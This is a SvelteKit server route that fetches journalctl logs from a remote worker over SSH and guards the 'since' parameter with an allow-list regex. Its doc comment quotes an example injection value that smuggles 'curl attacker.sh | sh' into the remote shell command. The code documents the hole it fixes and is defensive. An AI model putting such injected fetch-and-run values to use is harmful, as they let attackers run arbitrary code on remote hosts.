import { json } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { executeSSHCommand, type SSHConnectionConfig } from '$lib/server/ssh';
import { requireWorker, route } from '$lib/server/auth';

/**
 * A `--since` value that is safe to put in a remote shell command.
 *
 * `executeSSHCommand` passes the command as a single argv element, so the
 * *local* shell never interprets it — but the remote one does, and both of this
 * route's query parameters were interpolated into it raw. `?since=x"; curl
 * attacker.sh | sh; echo "` ran as the SSH user on the worker.
 *
 * Allow-listed rather than escaped: journalctl takes either an absolute
 * timestamp or a relative phrase, both of which are plain words, digits, colons
 * and hyphens. Nothing legitimate needs a quote or a semicolon, so anything
 * carrying one is refused rather than quietly rewritten.
 */
const SAFE_SINCE = /^[A-Za-z0-9 :+\-]{1,64}$/;

export const GET: RequestHandler = route((event) => handleRequest(event));
export const POST: RequestHandler = route((event) => handleRequest(event));

async function handleRequest(event: any) {
  const { params, url, request } = event;
  const { worker } = await requireWorker(event, params.id!);

  let sshPrivateKey: string | null = null;
  if (request.method === 'POST') {
    try {
      const body = await request.json();
      sshPrivateKey = body.sshPrivateKey;
    } catch {
      // Ignore parse errors
    }
  }

  if (!sshPrivateKey) {
    return json({
      events: [],
      count: 0,
      message: 'SSH key required to fetch system logs. Please provide an SSH key.',
    });
  }

  const since = url.searchParams.get('since') || '24 hours ago';
  if (!SAFE_SINCE.test(since)) {
    return json(
      { error: 'Invalid "since" value. Use a plain timestamp or a phrase like "24 hours ago".' },
      { status: 400 },
    );
  }

  // A count, so it is turned into one rather than pattern-matched.
  const lines = Math.min(Math.max(parseInt(url.searchParams.get('lines') || '1000', 10) || 1000, 1), 100_000);

  try {
    const sshConfig: SSHConnectionConfig = {
      host: worker.hostname,
      port: worker.sshPort,
      username: worker.sshUser,
      privateKey: sshPrivateKey,
    };

    // Fetch logs using journalctl in compact short-iso format (avoids huge JSON output)
    const command = `journalctl --since "${since}" -n ${lines} --no-pager --output=short-iso`;
    const result = await executeSSHCommand(sshConfig, command);

    if (result.exitCode !== 0) {
      throw new Error(result.stderr || `journalctl failed with exit code ${result.exitCode}`);
    }

    // short-iso format: "2025-05-07T12:34:56+0000 hostname process[pid]: message"
    const events = result.stdout
      .split('\n')
      .filter(l => l.trim() && !l.startsWith('--'))
      .map(l => {
        const spaceIdx = l.indexOf(' ');
        if (spaceIdx === -1) return null;
        const timestamp = l.substring(0, spaceIdx);
        const rest = l.substring(spaceIdx + 1);
        // rest = "hostname process[pid]: message"
        const colonIdx = rest.indexOf(': ');
        if (colonIdx === -1) return null;
        const message = rest.substring(colonIdx + 2).trim();
        const unitPart = rest.substring(0, colonIdx);
        // last token before colon is "process[pid]", strip pid
        const unitTokens = unitPart.trim().split(/\s+/);
        const unit = (unitTokens[unitTokens.length - 1] || '').replace(/\[\d+\]$/, '');
        return {
          timestamp,
          priority: classifyPriority(message),
          message,
          unit,
        };
      })
      .filter((e): e is NonNullable<typeof e> => e !== null);

    return json({
      events: events.reverse(), // Newest first
      count: events.length,
    });
  } catch (error: any) {
    return json({ error: error.message }, { status: 500 });
  }
}

function classifyPriority(msg: string): string {
  const lower = msg.toLowerCase();
  if (lower.includes('error') || lower.includes('failed') || lower.includes('failure') || lower.includes('panic') || lower.includes('fatal')) return 'error';
  if (lower.includes('warn') || lower.includes('deprecated')) return 'warning';
  return 'info';
}
